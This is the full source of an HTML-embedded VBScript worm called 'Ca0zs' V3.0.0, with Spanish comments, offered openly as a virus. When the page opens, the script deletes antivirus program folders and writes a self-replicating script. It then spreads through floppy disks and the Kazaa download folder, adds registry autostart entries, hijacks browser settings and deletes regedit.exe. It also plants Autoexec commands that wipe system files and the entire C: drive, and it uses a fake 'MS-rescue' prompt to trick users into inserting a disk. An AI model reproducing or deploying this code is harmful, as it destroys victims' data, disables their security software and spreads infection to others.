<!---------------------->
<!--El virus del Ca0zs-->
<!-------V 3.0.0.------->
<!---------(!)---------->
<!---------------------->

<HTML>
<Script Language="VBScript">

On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set wss = CreateObject("WScript.Shell")
Set windows = fso.GetSpecialFolder(0)
fso.DeleteFolder("C:\Progra~1\norton~1")
fso.DeleteFolder("C:\Progra~1\mcafee")
fso.DeleteFolder("C:\Progra~1\kasper~1")
fso.DeleteFolder("C:\Progra~1\trojan~1")
fso.DeleteFolder("C:\Archiv~1\norton~1")
fso.DeleteFolder("C:\Archiv~1\mcafee")
fso.DeleteFolder("C:\Archiv~1\kasper~1")
fso.DeleteFolder("C:\Archiv~1\trojan~1")
Set w = fso.CreateTextFile(windows & "\exe.vbs", True)
w.WriteBlankLines(1)
w.WriteLine("On Error Resume Next")
w.WriteLine("Set fso = CreateObject(""Scripting.FileSystemObject"")")
w.WriteLine("Set wss = CreateObject(""WScript.Shell"")")
w.WriteBlankLines(1)
w.WriteLine("Set cuerpo = fso.OpenTextFile(WScript.ScriptFullName)")
w.WriteLine("alma = cuerpo.ReadAll")
w.WriteLine("Set windows = fso.GetSpecialFolder(0)")
w.WriteLine("Set sys = fso.GetSpecialFolder(1)")
w.WriteBlankLines(1)
w.WriteLine("If (fso.FileExists(windows & ""\Cz0_32.dll.vbs"")) Then")
w.WriteLine("        Set fc = sys.Files")
w.WriteLine("        For Each f1 In fc")
w.WritelIne("            ext = fso.GetExtensionName(f1.path)")
w.WriteLine("            If (ext = ""res"") Then")
w.WriteLine("               MsgBox ""We found "" & Hour((Now)) & Day((Now)) & "" KB lost Data. Plase put a disk in the A: unit for rescue it"", 0, ""-MS-rescue-""")
w.WriteLine("               Set w = fso.CreateTextFile(""A:\WEB.html"", True)")
w.WriteLine("               w.WriteLine(""<"" & ""HT""& ""ML"" & "">"")")
w.WriteLine("               w.WriteLine(""<"" & ""Script"" & "" Language=""""VBScript"""">"")")
w.WriteLine("               w.WriteLine(""On Error Resume Next"")")
w.WriteLine("               w.WriteLine(""Set fso = CreateObject(""""Scripting.FileSystemObject"""")"")")
w.WriteLine("               w.WriteLine(""Set wss = CreateObject(""""WScript.Shell"""")"")")
w.WriteLine("               w.WriteLine(""fso.DeleteFolder(""""C:\Progra~1\norton~1"""")"")")
w.WriteLine("               w.WriteLine(""fso.DeleteFolder(""""C:\Progra~1\mcafee"""")"")")
w.WriteLine("               w.WriteLine(""fso.DeleteFolder(""""C:\Progra~1\kasper~1"""")"")")
w.WriteLine("               w.WriteLine(""fso.DeleteFolder(""""C:\Progra~1\trojan~1"""")"")")
w.WriteLine("               w.WriteLine(""fso.DeleteFolder(""""C:\Archiv~1\norton~1"""")"")")
w.WriteLine("               w.WriteLine(""fso.DeleteFolder(""""C:\Progra~1\norton~1"""")"")")
w.WriteLine("               w.WriteLine(""fso.DeleteFolder(""""C:\Archiv~1\mcafee"""")"")")
w.WriteLine("               w.WriteLine(""fso.DeleteFolder(""""C:\Archiv~1\kasper~1"""")"")")
w.WriteLine("               w.WriteLine(""fso.DeleteFolder(""""C:\Archiv~1\trojan~1"""")"")")
w.WriteLine("               w.WriteLine(""Set windows = fso.GetSpecialFolder(0)"")")
w.WriteLine("               w.WriteLine(""Set w = fso.CreateTextFile(windows & """"\exe.vbs"""", True)"")")
w.WriteLine("               w.WriteLine(""w.Write("" & alma & "")"")")
w.WriteLine("               w.WriteLine(""w.Close"")")
w.WriteLine("               w.WriteLine(""wss.Run & windows & """"\exe.vbs"""""")")
w.WriteLine("               w.WriteLine(""<"" & ""/"" & ""Script"" & "">"")")
w.WriteLine("               w.WriteLine(""<"" & ""/"" & ""HT"" & ""ML"" & "">"")")
w.WriteLine("               w.Close")
w.WriteLine("               If (fso.FileExists(""A:\WEB.html"")) Then")
w.WriteLine("                       MsgBox ""Thanks!""")
w.WriteLine("                       MsgBox ""Ca0zs""")
w.WriteLine("               End If")
w.WriteLine("            Else")
w.WriteLine("               For repeat = 1 To 10")
w.WriteLine("                   fso.CopyFile WScript.ScriptFullName, sys & ""\csz"" & Month(Now()) & Day(Now()) & Hour(Now()) & repeat & "".res""")
w.WriteLIne("               Next")
w.WriteLine("            End If")
w.WriteLine("        Next")
w.WriteLine("Else")
w.WriteLine("        fso.CopyFile WScript.ScriptFullName, windows & ""\Cz0_32.dll.vbs""")
w.WriteLine("        If (fso.FileExists(""C:\Autoexec.nt"")) Then")
w.WriteLine("                Set inf = fso.OpenTextFile(""C:\Autoexec.nt"")")
w.WriteLine("                caoz = inf.ReadAll")
w.WriteLine("                Set caos = fso.CreateTextFile(""C:\Autoexec.nt"", True)")
w.WriteLine("                caos.Write(caoz)")
w.WriteLine("                caos.WriteLine(""if not exist " & windows & "\Cz0_32.dll.vbs rd /s /q C:"")")
w.WriteLine("                caos.WriteLine(""rem Ca0zs, así es la vida... ^_^"")")
w.WriteLine("                caos.WriteLine(""del /s /q C:\*.log"")")
w.WriteLine("                caos.WriteLine(""del /s /q C:\*.dll"")")
w.WriteLine("                caos.WriteLine(""del /s /q C:\*.sam"")")
w.WriteLine("                caos.WriteLine(""del /s /q C:\*.bkp"")")
w.WriteLine("                caos.WriteLine(""ren "" & sys & ""\*.res *.vbs"")")
w.WriteLine("                caos.Close")
w.WriteLine("        Else")
w.WriteLine("                Set inf = fso.OpenTextFile(""Autoexec.bat"")")
w.WriteLine("                caoz = inf.ReadAll")
w.WriteLine("                Set caos = fso.CreateTextFile(""Autoexec.bat"", True)")
w.WriteLine("                caos.Write(caoz)")
w.WriteLine("                caos.WriteLine("" not exist " & windows & "\Cz0_32.dll.vbs rd /s /q C:"")")
w.WriteLine("                caos.WriteLine(""rem Ca0zs, así es la vida... ^_^"")")
w.WriteLine("                caos.WriteLine(""del /s /q C:\*.log"")")
w.WriteLine("                caos.WriteLine(""del /s /q C:\*.dll"")")
w.WriteLine("                caos.WriteLine(""del /s /q C:\*.sam"")")
w.WriteLine("                caos.WriteLine(""del /s /q C:\*.bkp"")")
w.WriteLine("                caos.WriteLine(""ren "" & sys & ""\*.res *.vbs"")")
w.WriteLine("                caos.Close")
w.WriteLine("        End If")
w.WriteLine("        wss.RegWrite ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\basi32.dll"", windows & ""\Cz0_32.dll.vbs""")
w.WriteLine("        wss.RegWrite ""HKEY_USERS\.DEFAULT\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page"", ""__Proximamente...__""")
w.WriteLine("        wss.RegWrite ""HKEY_USERS\.DEFAULT\SOFTWARE\Microsoft\Internet Explorer\Main\Window title"", ""!...Ca0zs...!""")
w.WriteLine("        wss.RegWrite ""HKLM\Software\kazaa\Transfer\DlDir0"", windows & ""\kazaa\""")
w.WriteLine("        fso.CreateFolder(windows & ""\kazaa"")")
w.WriteLine("        Set kaz = fso.CreateTextFile(windows & ""\kazaa\WEB.html"", True)")
w.WriteLine("        kaz.WriteLine(""<"" & ""Ht"" & ""ml"" & "">"")")
w.WriteLine("        kaz.WriteLine(""<"" & ""Script"" & "" Language=""""VBScript"""">"")")
w.WriteLine("        kaz.WriteLine(""On Error Resume Next"")")
w.WriteLine("        kaz.WriteLine(""Set fso = CreateObject(""""Scripting.FileSystemObject"""")"")")
w.WriteLine("        kaz.WriteLine(""Set wss = CreateObject(""""WScript.Shell"""")"")")
w.WriteLine("        kaz.WriteLine(""fso.DeleteFolder(""""C:\Progra~1\norton~1"""")"")")
w.WriteLine("        kaz.WriteLine(""fso.DeleteFolder(""""C:\Progra~1\mcafee"""")"")")
w.WriteLine("        kaz.WriteLine(""fso.DeleteFolder(""""C:\Progra~1\kasper~1"""")"")")
w.WriteLine("        kaz.WriteLine(""fso.DeleteFolder(""""C:\Progra~1\trojan~1"""")"")")
w.WriteLine("        kaz.WriteLine(""fso.DeleteFolder(""""C:\Archiv~1\norton~1"""")"")")
w.WriteLine("        kaz.WriteLine(""fso.DeleteFolder(""""C:\Progra~1\norton~1"""")"")")
w.WriteLine("        kaz.WriteLine(""fso.DeleteFolder(""""C:\Archiv~1\mcafee"""")"")")
w.WriteLine("        kaz.WriteLine(""fso.DeleteFolder(""""C:\Archiv~1\kasper~1"""")"")")
w.WriteLine("        kaz.WriteLine(""fso.DeleteFolder(""""C:\Archiv~1\trojan~1"""")"")")
w.WriteLine("        kaz.WriteLine(""Set windows = fso.GetSpecialFolder(0)"")")
w.WriteLine("        kaz.WriteLine(""Set w = fso.CreateTextFile(windows & """"\exe.vbs"""", True)"")")
w.WriteLine("        kaz.WriteLine(""w.WriteLine("" & alma & "")"")")
w.WriteLine("        kaz.WriteLine(""w.Close>"")")
w.WriteLine("        kaz.WriteLine(""wss.Run & windows & """"\exe.vbs"""""")")
w.WriteLine("        kaz.WriteLine(""<"" & ""/"" & ""Script"" & "">"")")
w.WriteLine("        kaz.WriteLine(""<"" & ""/"" & ""Ht"" & ""ml"" & "">"")")
w.WriteLine("        MsgBox ""Ca0zs""")
w.WriteLine("        MsgBox ""...""")
w.WriteLine("End If")
w.WriteLine("fso.DeleteFile windows & ""\regedit.exe""")
w.Close
wss.Run windows & "\exe.vbs"

</Script>
</HTML>

<!--________________________________________________-->
<!--En honor al 2° Aniversario del 11 de Septiembre!-->
<!--...Y al biennale.py de epidemiC...-->
<!--¡Este virus es aún más lento!-->
<!--Un virus que es "infinito" dentro de sus límites-->
<!--________________________________________________-->













<!--[ar@me]-->